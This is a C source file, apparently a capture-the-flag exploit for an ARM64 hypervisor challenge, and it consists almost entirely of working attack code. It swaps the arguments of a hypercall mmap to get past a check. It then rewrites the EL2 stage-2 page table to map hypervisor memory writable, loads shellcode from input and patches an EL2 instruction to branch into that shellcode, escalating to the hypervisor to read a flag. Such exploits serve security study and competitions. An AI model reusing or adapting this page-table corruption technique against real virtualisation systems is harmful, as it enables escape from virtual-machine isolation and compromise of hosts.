//debug is func delcare;
typedef unsigned long size_t;

int (*putchar)(const char str) = 0xFFFFFFFFC0009AA4;
int (*getchar)() = 0xFFFFFFFFC0009AD8;
void (*get_flag1)() = 0xFFFFFFFFC00091B8;
void (*el1_page_set)() = 0xFFFFFFFFC0008750;
size_t el0_base_va = 0x400000;
size_t el1_base_va = 0xFFFFFFFFC0000000;
size_t el0_base_pte = 0xffffffffc0023000;
size_t el1_base_pte = 0xffffffffc001e000;
size_t el1_page_table = 0xffffffffc001b000;
size_t el0_base_pa = 0x2c000;
size_t el2_base_ipa = 0x40107000;
size_t el2_base_pa = 0x40100000;
size_t el2_flag_addr = 0x4010FF00;

int _start(){
    main();
    return 0;
}

static unsigned long long int hvc(unsigned long long int arg1, unsigned long long int arg2, unsigned long long int arg3,unsigned long long int arg4){
    unsigned long long int ret;
    asm volatile (
        "mov x0, %1\n\t"
        "mov x1, %2\n\t"
        "mov x2, %3\n\t"
        "mov x3, %4\n\t"
        "hvc #0\n\t"
        : "=r" (ret)
        : "r" (arg1), "r" (arg2) , "r" (arg3) ,"r" (arg4) 
        : "x0","memory"
    );
    return ret;
}


void debug(){
    void (*smc)(size_t) = 0xFFFFFFFFC0009164;
    smc(el2_flag_addr);
}

void get_idx(size_t addr,size_t *pgd, size_t *pud, size_t *pmd, size_t *pte){
    *pgd = (addr >> 39) & 0x1FF;
    *pud = (addr >> 30) & 0x1FF;
    *pmd = (addr >> 21) & 0x1FF;
    *pte = (addr >> 12) & 0x1FF;
}

void readn(size_t addr,size_t size){
    for(int i=0;i<size;i++){
        *(char *)(addr+i) = getchar();
    }
}

void writen(size_t addr,size_t size){
    for(int i=0;i<size;i++){
        putchar(*(char *)(addr+i));
    }
}

int strlen(char *str){
    int len = 0;
    while(*str){
        len++;
        str++;
    }
    return len;
}

void puts(char *str){
    writen((size_t)str,strlen(str));
}

void mmap(size_t addr, size_t attr){
    hvc(1, addr, attr, 0);
}

void memcpy(size_t dst,size_t src,size_t len){
    size_t i;
    for(i = 0; i < len; i++){
        *(char *)(dst + i) = *(char *)(src + i);
    }
}

void flush_tlb(){
    asm volatile("TLBI VMALLE1");
}

#define EL2_NX 0x40000000000000
#define EL1_NX 0x20000000000000
#define EL2_RW 0x4c3
#define EL1_RW 0x40000000000403

void main(){
    // get_flag1();
    size_t fake_addr = 0x107000;
    size_t fake_attr = EL2_RW;
    size_t target_ipa = 0x10c000;
    size_t el1_buf1 = el1_base_va + 0x1000;
    size_t el1_attr = EL1_RW | EL1_NX;
    size_t el2_base_buffer_el1_paddr = 0x1000;
    size_t el2_base_buffer = el1_base_va + 0x2000;
    size_t shellcode_buffer = el1_base_va + 0x3000;
    size_t shellcode_buffer_el2 = 0x4010F000;
    size_t shellcode_buffer_el2_paddr = 0x2000;

    // add el1_buf at el2_ipa_table + offset
    el1_page_set(0, el1_page_table, el1_buf1, el1_attr | 0);
    mmap(fake_attr, fake_addr); // swap attr and addr to bypass check
    flush_tlb();

    // modify ipa table
    *(size_t*)(el1_buf1+8) = el2_base_pa |EL2_RW;
    el1_page_set(0, el1_page_table, el2_base_buffer, el1_attr | el2_base_buffer_el1_paddr);
    *(size_t*)(el1_buf1+16) = shellcode_buffer_el2 |EL2_RW;
    el1_page_set(0, el1_page_table, shellcode_buffer, el1_attr | shellcode_buffer_el2_paddr);
    flush_tlb();
    
    memcpy(shellcode_buffer + 0x200, get_flag1, 0x44); 
    readn(shellcode_buffer, 0x200);
    *(unsigned int*)(el2_base_buffer + 0x760) = 0x94003A28; // BL              dword_4010F000

    debug();
}